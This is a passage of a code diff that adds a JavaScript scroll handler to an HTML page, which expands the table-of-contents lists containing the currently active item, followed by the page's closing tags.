+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+    </body>
+</html>
